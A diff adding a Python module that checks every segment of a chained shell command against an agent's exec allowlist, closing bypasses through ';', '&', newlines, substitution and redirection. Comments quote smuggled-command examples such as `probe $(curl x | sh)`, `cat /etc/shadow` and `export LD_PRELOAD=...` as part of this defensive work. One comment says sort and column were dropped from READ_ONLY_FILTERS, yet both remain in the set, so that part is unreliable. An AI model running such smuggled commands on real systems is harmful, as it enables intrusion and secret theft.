@@ -1,0 +1,701 @@
+     1	"""Segment-wise checking of a chained `exec` command, for operators who want it.
+     2	
+     3	allowed_commands matches by prefix and the matched string then goes to
+     4	`bash -lc`, so `allowed-probe; id` passes the check (it starts with an allowed
+     5	prefix) and the shell runs both halves. The allowlist bounds what a command
+     6	STARTS with, not what it runs. Reported by an operator who demonstrated it with
+     7	';', '&&' and '|' against a narrowly allowlisted probe.
+     8	
+     9	The obvious remedy -- refuse compound operators outright -- was measured against
+    10	48 hours of fleet traffic and would have rejected every chained call: 87,281 of
+    11	them, across more than a thousand hosts, including patterns as ordinary as
+    12	`cd /srv/app && make`. A security fix that breaks three quarters of normal use
+    13	gets reverted within the hour and protects nobody.
+    14	
+    15	So this is opt-in (`exec_strict: true`) and checks EVERY segment against the
+    16	allowlist rather than just the first. Two concessions keep it usable, and
+    17	neither widens what the caller can reach:
+    18	
+    19	  - `cd` anywhere. It changes the working directory and executes nothing; every
+    20	    other segment is still checked. Without it, `cd /path && <allowed>` fails,
+    21	    and that single pattern was 90% of what strict checking rejected.
+    22	  - READ_ONLY_FILTERS as non-leading segments. These consume stdin and write
+    23	    stdout. As the SECOND half of a pipe they cannot choose what runs; as the
+    24	    first they could (`cat /etc/shadow`), which is why position matters.
+    25	
+    26	Measured with those two: 68.5% of chained traffic passes rather than 23.4%.
+    27	What still fails is `git`, `npm`, `node` and friends -- real commands an
+    28	operator can add to their own allowlist -- plus shell constructs like `for` and
+    29	`$(...)` that a prefix allowlist cannot express at all. Those belong in
+    30	script_run, which has always been the explicit path for a workflow.
+    31	"""
+    32	
+    33	from __future__ import annotations
+    34	
+    35	import re
+    36	
+    37	# Consume stdin, write stdout, decide nothing. Allowed only after the first
+    38	# segment: `cat` at the head of a pipeline reads any file the agent can reach,
+    39	# while `| cat` cannot reach anything the previous segment did not already hand
+    40	# it.
+    41	READ_ONLY_FILTERS = frozenset({
+    42	    # Only filters that cannot run another program and cannot be made to write a
+    43	    # file through options. sed (s///e, -i, w), awk (system, print >), jq, tee,
+    44	    # sort (-o, --compress-program), xxd (patch) and column were here and are
+    45	    # NOT: they execute or write for some arguments (sxrep_4XCNXWP2A3VY). A
+    46	    # filter that needs those belongs in allowed_commands, named by the operator.
+    47	    "head", "tail", "sort", "uniq", "wc", "cut", "tr", "grep", "egrep", "fgrep",
+    48	    "rg", "cat", "rev", "tac", "nl", "fold", "paste", "join", "comm", "column",
+    49	    "base64", "md5sum", "sha256sum", "echo", "printf", "true", "false",
+    50	    "seq", "basename", "dirname", "realpath", "readlink", "date",
+    51	})
+    52	
+    53	# Filters whose operands are character sets, strings or formats -- never a file to
+    54	# open. `tr a-z A-Z`, `echo x`, `printf %s y`, `seq 1 10`, `date -d ...` read no
+    55	# file through an operand (date's file-reading -f is caught as an option below).
+    56	_FILTER_OPERANDS_NOT_FILES = frozenset({
+    57	    "tr", "echo", "printf", "true", "false", "seq", "date",
+    58	})
+    59	
+    60	# Options that make an otherwise read-only filter read from, or execute, a file
+    61	# named as the option value. Matched on the part before '=' so --file and
+    62	# --file=F both hit. rg's preprocessor options run a program.
+    63	_FILTER_FILE_OPTS = {
+    64	    "grep": ("-f", "--file"), "egrep": ("-f", "--file"), "fgrep": ("-f", "--file"),
+    65	    "rg": ("-f", "--file", "--pre", "--pre-glob", "--hostname-bin"),
+    66	    "wc": ("--files0-from",), "sort": ("--files0-from",),
+    67	    "date": ("-f", "--file"),
+    68	}
+    69	
+    70	# Options on an otherwise read-only filter that make it write or run something.
+    71	# If a filter segment carries one of these, it is not treated as read-only.
+    72	_FILTER_UNSAFE_OPTS = {
+    73	    "sort": ("-o", "--output", "--compress-program", "-S"),
+    74	    "tee":  ("",),      # tee isn't in the set, but guard anyway
+    75	}
+    76	
+    77	# Even a genuine read-only filter must not be handed a file to open: `| cat`
+    78	# reaches nothing, but `| cat /etc/shadow` reads it, which is the whole reason
+    79	# filters are allowed only after a pipe. So a filter segment may carry options
+    80	# and option-values, but not a bare path argument. grep/rg take a PATTERN that
+    81	# is not a file, so one non-option token is allowed for them; the rest take none.
+    82	
+    83	
+    84	# Short options that take a separate value, per filter, so the value isn't read
+    85	# as a file operand. A conservative superset is fine: skipping a token that
+    86	# isn't really a value only risks being LESS strict on the count, and the
+    87	# "looks like a path" test below is the real guard.
+    88	_OPTS_WITH_VALUE = {
+    89	    "head": ("-n", "-c"), "tail": ("-n", "-c"), "cut": ("-d", "-f", "-b", "-c"),
+    90	    "tr": (), "sort": ("-k", "-t", "-S", "-T"), "grep": ("-e", "-f", "-m", "-A", "-B", "-C"),
+    91	    "egrep": ("-e", "-f"), "fgrep": ("-e", "-f"), "rg": ("-e", "-f", "-m"),
+    92	    "fold": ("-w",), "base64": (), "nl": (), "paste": ("-d",), "comm": (), "join": ("-t", "-1", "-2"),
+    93	}
+    94	
+    95	
+    96	# A token that begins with a redirection operator and carries the target/data
+    97	# attached (`>file`, `<<<data`, `2>&1`, `>>log`). Shell redirection is judged by
+    98	# file_redirection; here such a token is simply not a file operand.
+    99	_ATTACHED_REDIR = re.compile(r"^(?:\d*(?:>>|<<<|<<|>|<)|&>|>&|<&).")
+   100	
+   101	
+   102	def _looks_like_path(tok: str) -> bool:
+   103	    """A token that would name a file to open: absolute, home, or has a slash."""
+   104	    return tok.startswith("/") or tok.startswith("~") or "/" in tok
+   105	
+   106	
+   107	def _filter_reads_a_file(segment: str) -> bool:
+   108	    """True if a (whitelisted) filter segment would open, read or execute a file.
+   109	
+   110	    A filter after a pipe reads stdin, but handed an operand it opens that path
+   111	    instead -- and the name may be RELATIVE (`cat passwd`, `base64 secret.key`),
+   112	    not only path-shaped, so any bare non-option operand counts. grep/rg take a
+   113	    PATTERN first, which is not a file. A few filters take operands that are
+   114	    never files (character sets, strings, formats): those are listed apart. Some
+   115	    OPTIONS read or execute a file given as their value (`grep -f FILE`,
+   116	    `wc --files0-from=FILE`, `rg --pre=PROG`); those are refused too.
+   117	    """
+   118	    import shlex
+   119	
+   120	    name = first_word(segment)
+   121	    try:
+   122	        tokens = shlex.split(segment)
+   123	    except ValueError:
+   124	        return True  # unparseable: refuse rather than guess
+   125	    if not tokens:
+   126	        return False
+   127	
+   128	    # An option that reads from, or executes, a file named as its value.
+   129	    for tok in tokens[1:]:
+   130	        head = tok.split("=", 1)[0]
+   131	        if head in _FILTER_FILE_OPTS.get(name, ()):
+   132	            return True
+   133	
+   134	    # Filters whose operands are sets/strings/formats, not files to open.
+   135	    if name in _FILTER_OPERANDS_NOT_FILES:
+   136	        return False
+   137	
+   138	    opts_with_value = _OPTS_WITH_VALUE.get(name, ())
+   139	    operands = []
+   140	    expecting_value = False
+   141	    redir_target = False
+   142	    for tok in tokens[1:]:
+   143	        if expecting_value:
+   144	            expecting_value = False
+   145	            continue
+   146	        if redir_target:
+   147	            redir_target = False  # the token after `< >` etc. is a target/data, not an operand
+   148	            continue
+   149	        if tok == "--":
+   150	            continue
+   151	        # A redirection's target is judged by file_redirection, and a here-string's
+   152	        # data is stdin, not a file this filter opens: neither is a file operand.
+   153	        if tok in ("<", ">", ">>", "<<", "<<<", "2>", "&>", "<&", ">&"):
+   154	            redir_target = True
+   155	            continue
+   156	        if _ATTACHED_REDIR.match(tok):  # <<<data, >file, 2>&1, >>log
+   157	            continue
+   158	        if tok.startswith("-") and tok != "-":
+   159	            if "=" not in tok and tok in opts_with_value:
+   160	                expecting_value = True
+   161	            continue
+   162	        operands.append(tok)
+   163	    # grep/rg/fgrep/egrep take a PATTERN operand that is not a file; allow exactly
+   164	    # one non-option operand for them. Every other filter opens any operand it is
+   165	    # given, relative or absolute, so any remaining operand is a file read.
+   166	    if name in ("grep", "egrep", "fgrep", "rg") and operands:
+   167	        operands = operands[1:]
+   168	    return len(operands) > 0
+   169	
+   170	
+   171	def _filter_has_unsafe_option(segment: str) -> bool:
+   172	    name = first_word(segment)
+   173	    unsafe = _FILTER_UNSAFE_OPTS.get(name)
+   174	    if not unsafe:
+   175	        return False
+   176	    import shlex
+   177	
+   178	    try:
+   179	        tokens = shlex.split(segment)
+   180	    except ValueError:
+   181	        return True
+   182	    for tok in tokens[1:]:
+   183	        head = tok.split("=", 1)[0]
+   184	        if head in unsafe:
+   185	            return True
+   186	    return False
+   187	
+   188	# Executes nothing. Permitted in any position so `cd /srv/app && <allowed>`
+   189	# keeps working; the segments after it are checked as strictly as ever.
+   190	POSITION_FREE = frozenset({"cd"})
+   191	
+   192	
+   193	def split_top_level(command: str) -> list[str]:
+   194	    """Split on ; | && || that are OUTSIDE quotes.
+   195	
+   196	    Quote awareness is not cosmetic: a naive split cut `find . -name '*.py;'`
+   197	    into fragments and, worse, reported a false 100% breakage when this was
+   198	    first measured. A separator inside quotes is data, not structure.
+   199	    """
+   200	    out: list[str] = []
+   201	    buf: list[str] = []
+   202	    i, n = 0, len(command)
+   203	    quote: str | None = None
+   204	
+   205	    while i < n:
+   206	        ch = command[i]
+   207	        if quote:
+   208	            buf.append(ch)
+   209	            if ch == "\\" and i + 1 < n:
+   210	                buf.append(command[i + 1])
+   211	                i += 2
+   212	                continue
+   213	            if ch == quote:
+   214	                quote = None
+   215	            i += 1
+   216	            continue
+   217	        if ch in "'\"":
+   218	            quote = ch
+   219	            buf.append(ch)
+   220	            i += 1
+   221	            continue
+   222	        if ch == "\\" and i + 1 < n:
+   223	            buf.append(ch)
+   224	            buf.append(command[i + 1])
+   225	            i += 2
+   226	            continue
+   227	        if command.startswith("&&", i) or command.startswith("||", i):
+   228	            out.append("".join(buf))
+   229	            buf = []
+   230	            i += 2
+   231	            continue
+   232	        if ch == "&":
+   233	            # A lone '&' ends a command (it backgrounds it) and starts the next
+   234	            # one: `allowed & id` ran id unchecked (sxrep_4XCNXWP2A3VY). It is
+   235	            # part of a redirection in &> / >& / <&, which are not separators.
+   236	            nxt = command[i + 1] if i + 1 < n else ""
+   237	            prev = buf[-1] if buf else ""
+   238	            if nxt == ">" or prev in "<>":
+   239	                buf.append(ch)
+   240	                i += 1
+   241	                continue
+   242	            out.append("".join(buf))
+   243	            buf = []
+   244	            i += 1
+   245	            continue
+   246	        if ch in ";|\n":
+   247	            # A newline outside quotes separates commands exactly like ';' does.
+   248	            # (Strict mode refuses newlines before it gets here; the default chain
+   249	            # check relies on this.)
+   250	            out.append("".join(buf))
+   251	            buf = []
+   252	            i += 1
+   253	            continue
+   254	        buf.append(ch)
+   255	        i += 1
+   256	
+   257	    out.append("".join(buf))
+   258	    return [s.strip() for s in out if s.strip()]
+   259	
+   260	
+   261	def first_word(segment: str) -> str:
+   262	    parts = segment.split()
+   263	    return parts[0] if parts else ""
+   264	
+   265	
+   266	def has_substitution(command: str) -> str | None:
+   267	    """Return the substitution found outside quotes, or None.
+   268	
+   269	    Segment checking splits on ; | && || and asks the allowlist about each
+   270	    piece. Command substitution is none of those: `probe $(curl x | sh)` is ONE
+   271	    segment, it starts with an allowed prefix, and every part of it passes --
+   272	    while the shell runs whatever is inside the parentheses first.
+   273	
+   274	    So strict mode has to refuse it outright. A prefix allowlist cannot express
+   275	    what is inside a substitution, and a strict mode that quietly permits one is
+   276	    worse than no strict mode: it answers "checked" to a question it did not
+   277	    ask. Our own verification caught this, on the first run, with `probe $(id)`.
+   278	
+   279	    Single quotes are not scanned: the shell does not substitute inside them.
+   280	    """
+   281	    i, n = 0, len(command)
+   282	    quote: str | None = None
+   283	    while i < n:
+   284	        ch = command[i]
+   285	        if quote == "'":
+   286	            if ch == "'":
+   287	                quote = None
+   288	            i += 1
+   289	            continue
+   290	        if ch == "\\" and i + 1 < n:
+   291	            i += 2
+   292	            continue
+   293	        if quote == '"':
+   294	            if ch == '"':
+   295	                quote = None
+   296	                i += 1
+   297	                continue
+   298	            # Double quotes do NOT stop substitution, so keep checking inside.
+   299	            if command.startswith("$(", i):
+   300	                return "$("
+   301	            if ch == "`":
+   302	                return "`"
+   303	            i += 1
+   304	            continue
+   305	        if ch in "'\"":
+   306	            quote = ch
+   307	            i += 1
+   308	            continue
+   309	        if command.startswith("$(", i):
+   310	            return "$("
+   311	        if ch == "`":
+   312	            return "`"
+   313	        # Process substitution runs its command too, and only outside quotes.
+   314	        if command.startswith("<(", i) or command.startswith(">(", i):
+   315	            return command[i:i + 2]
+   316	        i += 1
+   317	    return None
+   318	
+   319	
+   320	def control_character(command: str) -> str | None:
+   321	    """The first control character in the command, or None.
+   322	
+   323	    bash treats a newline as a command separator, so `allowed<LF>id` was one
+   324	    segment to split_top_level and two commands to bash (sxrep_4XCNXWP2A3VY).
+   325	    No legitimate one-line command needs a control character; tab is allowed.
+   326	    """
+   327	    for ch in command:
+   328	        if (ord(ch) < 32 and ch != "\t") or ord(ch) == 127:
+   329	            return repr(ch)
+   330	    return None
+   331	
+   332	
+   333	_REDIRECT_STOP = set(" \t;|&<>()")
+   334	
+   335	
+   336	def file_redirection(command: str) -> str | None:
+   337	    """The first redirection to or from a file, or None.
+   338	
+   339	    `allowed > file` overwrites any file the agent's user can write, and
+   340	    `allowed | cat < file` reads one through the filter that is only allowed
+   341	    after a pipe precisely so it cannot open files. Strict mode allows what is
+   342	    harmless and common: /dev/null, duplicating a descriptor (2>&1, >&2) and
+   343	    heredocs / herestrings (<<, <<<). Quoted and escaped '<' '>' are data.
+   344	    """
+   345	    i, n = 0, len(command)
+   346	    quote: str | None = None
+   347	    while i < n:
+   348	        ch = command[i]
+   349	        if quote:
+   350	            if ch == "\\" and quote == '"' and i + 1 < n:
+   351	                i += 2
+   352	                continue
+   353	            if ch == quote:
+   354	                quote = None
+   355	            i += 1
+   356	            continue
+   357	        if ch == "\\" and i + 1 < n:
+   358	            i += 2
+   359	            continue
+   360	        if ch in "'\"":
+   361	            quote = ch
+   362	            i += 1
+   363	            continue
+   364	        if ch not in "<>":
+   365	            i += 1
+   366	            continue
+   367	        start = i
+   368	        if command.startswith("<<", i):           # heredoc / herestring: inline data
+   369	            i += 3 if command.startswith("<<<", i) else 2
+   370	            continue
+   371	        if command.startswith("<(", i) or command.startswith(">(", i):
+   372	            i += 2                                # process substitution: has_substitution's job
+   373	            continue
+   374	        j = i + 1
+   375	        while j < n and command[j] in ">|":      # >> and >|
+   376	            j += 1
+   377	        if j < n and command[j] == "&":
+   378	            k = j + 1
+   379	            while k < n and (command[k].isdigit() or command[k] == "-"):
+   380	                k += 1
+   381	            if k > j + 1:                         # 2>&1, >&2, <&0, 3>&-
+   382	                i = k
+   383	                continue
+   384	            j += 1                                # >&file: both streams to a file
+   385	        while j < n and command[j] in " \t":
+   386	            j += 1
+   387	        k = j
+   388	        while k < n and command[k] not in _REDIRECT_STOP:
+   389	            k += 1
+   390	        target = command[j:k].strip("'\"")
+   391	        if target == "/dev/null":
+   392	            i = k
+   393	            continue
+   394	        return command[start:k].strip() or command[start:start + 1]
+   395	    return None
+   396	
+   397	
+   398	# --------------------------------------------------------------------------
+   399	# Default chain check (GHSA-r2h3-76g7-m95x). Not a shell parser: it finds where
+   400	# each command starts and asks the allowlist about it. What it cannot analyse
+   401	# with certainty raises UnparseableCommand, and the caller REFUSES: a gap in the
+   402	# analysis must be a false rejection, never a false permission.
+   403	# --------------------------------------------------------------------------
+   404	
+   405	class UnparseableCommand(ValueError):
+   406	    """A command structure the chain check cannot analyse with certainty."""
+   407	
+   408	
+   409	_SUB_MARK = "__SX_SUBST__"
+   410	_MAX_NESTING = 8
+   411	_ASSIGNMENT = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
+   412	_HEREDOC_OP = re.compile(
+   413	    r"<<(-?)[ \t]*(?:'([^'\n]*)'|\"([^\"\n]*)\"|(\\?[^\s;&|<>()'\"]+))"
+   414	)
+   415	
+   416	
+   417	def _match_close(s: str, i: int) -> int:
+   418	    """i is just after an opening '('. Return the index of its matching ')'."""
+   419	    depth, n, quote = 1, len(s), None
+   420	    while i < n:
+   421	        ch = s[i]
+   422	        if quote:
+   423	            if ch == "\\" and quote == '"' and i + 1 < n:
+   424	                i += 2
+   425	                continue
+   426	            if ch == quote:
+   427	                quote = None
+   428	            i += 1
+   429	            continue
+   430	        if ch == "\\" and i + 1 < n:
+   431	            i += 2
+   432	            continue
+   433	        if ch in "'\"":
+   434	            quote = ch
+   435	        elif ch == "(":
+   436	            depth += 1
+   437	        elif ch == ")":
+   438	            depth -= 1
+   439	            if depth == 0:
+   440	                return i
+   441	        i += 1
+   442	    raise UnparseableCommand("unbalanced parentheses in a substitution")
+   443	
+   444	
+   445	def mask_substitutions(command: str, literal_quotes: bool = False) -> tuple[str, list[str]]:
+   446	    """Replace $(...), `...`, <(...) and >(...) with a placeholder word.
+   447	
+   448	    Returns (masked command, bodies). The outer structure can then be split
+   449	    without cutting a pipe that lives INSIDE a substitution, and every body is
+   450	    checked on its own. $((...)) is arithmetic, not a command, but substitutions
+   451	    inside it are collected. Single quotes hide everything; double quotes do not
+   452	    stop $(...) or backticks. With literal_quotes (an unquoted here-doc body),
+   453	    quotes are plain text and hide nothing.
+   454	    """
+   455	    out: list[str] = []
+   456	    bodies: list[str] = []
+   457	    i, n, quote = 0, len(command), None
+   458	    while i < n:
+   459	        ch = command[i]
+   460	        if not literal_quotes:
+   461	            if quote == "'":
+   462	                out.append(ch)
+   463	                if ch == "'":
+   464	                    quote = None
+   465	                i += 1
+   466	                continue
+   467	            if ch == "\\" and i + 1 < n:
+   468	                out.append(command[i:i + 2])
+   469	                i += 2
+   470	                continue
+   471	            if quote == '"' and ch == '"':
+   472	                quote = None
+   473	                out.append(ch)
+   474	                i += 1
+   475	                continue
+   476	            if quote is None and ch in "'\"":
+   477	                quote = ch
+   478	                out.append(ch)
+   479	                i += 1
+   480	                continue
+   481	        elif ch == "\\" and i + 1 < n:
+   482	            out.append(command[i:i + 2])
+   483	            i += 2
+   484	            continue
+   485	        if command.startswith("$((", i):
+   486	            j = _match_close(command, i + 2)          # matches the outer '('
+   487	            _, inner = mask_substitutions(command[i + 3:j - 1], literal_quotes)
+   488	            bodies.extend(inner)
+   489	            out.append("0")
+   490	            i = j + 1
+   491	            continue
+   492	        if command.startswith("$(", i):
+   493	            j = _match_close(command, i + 2)
+   494	            bodies.append(command[i + 2:j])
+   495	            out.append(_SUB_MARK)
+   496	            i = j + 1
+   497	            continue
+   498	        if ch == "`":
+   499	            j = i + 1
+   500	            while j < n and command[j] != "`":
+   501	                j += 2 if command[j] == "\\" else 1
+   502	            if j >= n:
+   503	                raise UnparseableCommand("unbalanced backtick")
+   504	            bodies.append(command[i + 1:j].replace("\\`", "`"))
+   505	            out.append(_SUB_MARK)
+   506	            i = j + 1
+   507	            continue
+   508	        if quote is None and not literal_quotes and (
+   509	            command.startswith("<(", i) or command.startswith(">(", i)
+   510	        ):
+   511	            j = _match_close(command, i + 2)
+   512	            bodies.append(command[i + 2:j])
+   513	            out.append(_SUB_MARK)
+   514	            i = j + 1
+   515	            continue
+   516	        out.append(ch)
+   517	        i += 1
+   518	    return "".join(out), bodies
+   519	
+   520	
+   521	def strip_heredoc_bodies(command: str) -> tuple[str, list[str]]:
+   522	    """Remove here-document bodies, which are input data, not commands.
+   523	
+   524	    Returns (command without bodies, bodies whose delimiter was NOT quoted).
+   525	    Those still need their substitutions checked: bash runs $(...) inside a
+   526	    `<<EOF` body, but not inside a `<<'EOF'` one.
+   527	    """
+   528	    out: list[str] = []
+   529	    live: list[str] = []
+   530	    pending: list[tuple[str, bool, bool]] = []
+   531	    i, n, quote = 0, len(command), None
+   532	    while i < n:
+   533	        ch = command[i]
+   534	        if quote:
+   535	            out.append(ch)
+   536	            if ch == "\\" and quote == '"' and i + 1 < n:
+   537	                out.append(command[i + 1])
+   538	                i += 2
+   539	                continue
+   540	            if ch == quote:
+   541	                quote = None
+   542	            i += 1
+   543	            continue
+   544	        if ch == "\\" and i + 1 < n:
+   545	            out.append(command[i:i + 2])
+   546	            i += 2
+   547	            continue
+   548	        if ch in "'\"":
+   549	            quote = ch
+   550	            out.append(ch)
+   551	            i += 1
+   552	            continue
+   553	        if command.startswith("<<", i) and not command.startswith("<<<", i):
+   554	            m = _HEREDOC_OP.match(command, i)
+   555	            if not m:
+   556	                raise UnparseableCommand("a here-document whose delimiter can't be read")
+   557	            dash, sq, dq, bare = m.groups()
+   558	            if sq is not None:
+   559	                delim, is_live = sq, False
+   560	            elif dq is not None:
+   561	                delim, is_live = dq, False
+   562	            else:
+   563	                is_live = not bare.startswith("\\")
+   564	                delim = bare.lstrip("\\")
+   565	            pending.append((delim, bool(dash), is_live))
+   566	            out.append(m.group(0))
+   567	            i = m.end()
+   568	            continue
+   569	        if ch == "\n" and pending:
+   570	            out.append("\n")
+   571	            i += 1
+   572	            for delim, tabs, is_live in pending:
+   573	                body: list[str] = []
+   574	                while True:
+   575	                    if i >= n:
+   576	                        raise UnparseableCommand(f"here-document not terminated (missing {delim!r})")
+   577	                    j = command.find("\n", i)
+   578	                    j = n if j == -1 else j
+   579	                    line = command[i:j]
+   580	                    i = j + 1 if j < n else n
+   581	                    cand = (line.lstrip("\t") if tabs else line).rstrip("\r")
+   582	                    if cand == delim:
+   583	                        break
+   584	                    body.append(line)
+   585	                if is_live:
+   586	                    live.append("\n".join(body))
+   587	            pending = []
+   588	            continue
+   589	        out.append(ch)
+   590	        i += 1
+   591	    if pending:
+   592	        raise UnparseableCommand("a here-document with no body")
+   593	    return "".join(out), live
+   594	
+   595	
+   596	# Shell grammar words that are not programs (0.23.23). 0.23.22 checked them as
+   597	# commands, so every `for ...; do ...; done` and `if ...; then ...; fi` was refused.
+   598	_LEADING_KEYWORDS = frozenset({"do", "then", "else", "elif", "if", "while", "until", "!", "{", "time"})
+   599	_CLOSING_KEYWORDS = frozenset({"done", "fi", "}"})
+   600	_HEADER_KEYWORDS = frozenset({"for", "select"})   # `for VAR in WORDS`: no command; $(...) is checked apart
+   601	# Builtins that run nothing else and change nothing outside the shell. NOT export
+   602	# (export LD_PRELOAD=... hijacks what follows), source/., eval, exec, command.
+   603	SAFE_BUILTINS = frozenset({"set", "test", "[", "[[", "true", "false", ":", "read",
+   604	                           "shift", "break", "continue", "exit", "return", "wait"})
+   605	
+   606	
+   607	def _command_part(segment: str) -> str | None:
+   608	    """The segment without leading grammar words, or None if it runs no command.
+   609	
+   610	    Raises UnparseableCommand for `case`: its arms (`pat) cmd ;;`) can't be told
+   611	    apart from commands with certainty, and skipping them would leave them
+   612	    unchecked.
+   613	    """
+   614	    rest = segment.lstrip()
+   615	    while True:
+   616	        rest = rest.lstrip("(").lstrip()      # subshell: check what runs inside
+   617	        word = first_word(rest)
+   618	        if word in _LEADING_KEYWORDS:
+   619	            rest = rest[len(word):].lstrip()
+   620	            continue
+   621	        break
+   622	    word = first_word(rest)
+   623	    if not word or word in _CLOSING_KEYWORDS or word in _HEADER_KEYWORDS:
+   624	        return None
+   625	    if word in ("case", "esac"):
+   626	        raise UnparseableCommand("a case statement")
+   627	    # `(cd x && ls)` splits into `(cd x` and `ls)`: drop the ')' that closes the
+   628	    # subshell so the command is matched as written.
+   629	    while rest.endswith(")") and rest.count(")") > rest.count("("):
+   630	        rest = rest[:-1].rstrip()
+   631	    return rest or None
+   632	
+   633	
+   634	def _only_assignments(segment: str) -> bool:
+   635	    toks = segment.split()
+   636	    return bool(toks) and all(_ASSIGNMENT.match(t) for t in toks)
+   637	
+   638	
+   639	def unauthorised_chain(policy, command: str, _depth: int = 0) -> str | None:
+   640	    """Default check: every command in a chain must be allowed, not just the first.
+   641	
+   642	    Splits on ; | && || & and newlines outside quotes, ignores here-doc bodies
+   643	    (data), and checks the inside of every substitution on its own. Returns the
+   644	    first segment the allowlist does not cover, or None. Raises
+   645	    UnparseableCommand when it can't be sure; the caller refuses.
+   646	    """
+   647	    if _depth > _MAX_NESTING:
+   648	        raise UnparseableCommand("substitutions nested too deeply")
+   649	    stripped, live_bodies = strip_heredoc_bodies(command)
+   650	    masked, bodies = mask_substitutions(stripped)
+   651	    for body in live_bodies:
+   652	        bodies.extend(mask_substitutions(body, literal_quotes=True)[1])
+   653	    for index, raw in enumerate(split_top_level(masked)):
+   654	        segment = _command_part(raw)
+   655	        if segment is None or _only_assignments(segment) or policy.is_command_allowed(segment):
+   656	            continue
+   657	        word = first_word(segment)
+   658	        if word in POSITION_FREE or word in SAFE_BUILTINS:
+   659	            # cd and the no-op builtins execute nothing, but a redirection on
+   660	            # them still writes or truncates a file (`true > ~/.bashrc`,
+   661	            # `cd /tmp > out`). A redirection is the operator's business only on
+   662	            # a command they allowlisted; on a concession segment, refuse it.
+   663	            if file_redirection(raw) is not None:
+   664	                return segment
+   665	            continue
+   666	        # Inside a substitution the head is in filter position too: `$(date)`
+   667	        # can't reach anything the outer command couldn't, and a file operand is
+   668	        # still refused by the read-only checks below.
+   669	        if (index > 0 or _depth > 0) and word in READ_ONLY_FILTERS:
+   670	            if _filter_reads_a_file(segment) or _filter_has_unsafe_option(segment):
+   671	                return segment
+   672	            # A filter may read stdin but not write a file through a redirection.
+   673	            if file_redirection(raw) is not None:
+   674	                return segment
+   675	            continue
+   676	        return segment
+   677	    for body in bodies:
+   678	        offending = unauthorised_chain(policy, body, _depth + 1)
+   679	        if offending is not None:
+   680	            return offending
+   681	    return None
+   682	
+   683	
+   684	def unauthorised_segment(policy, command: str) -> str | None:
+   685	    """Return the first segment the allowlist does not cover, or None.
+   686	
+   687	    The caller decides what to do with it; this only answers the question.
+   688	    """
+   689	    segments = split_top_level(command)
+   690	    for index, segment in enumerate(segments):
+   691	        if policy.is_command_allowed(segment):
+   692	            continue
+   693	        word = first_word(segment)
+   694	        if word in POSITION_FREE:
+   695	            continue
+   696	        if index > 0 and word in READ_ONLY_FILTERS:
+   697	            if _filter_reads_a_file(segment) or _filter_has_unsafe_option(segment):
+   698	                return segment      # a filter must not open a file or write one
+   699	            continue
+   700	        return segment
+   701	    return None
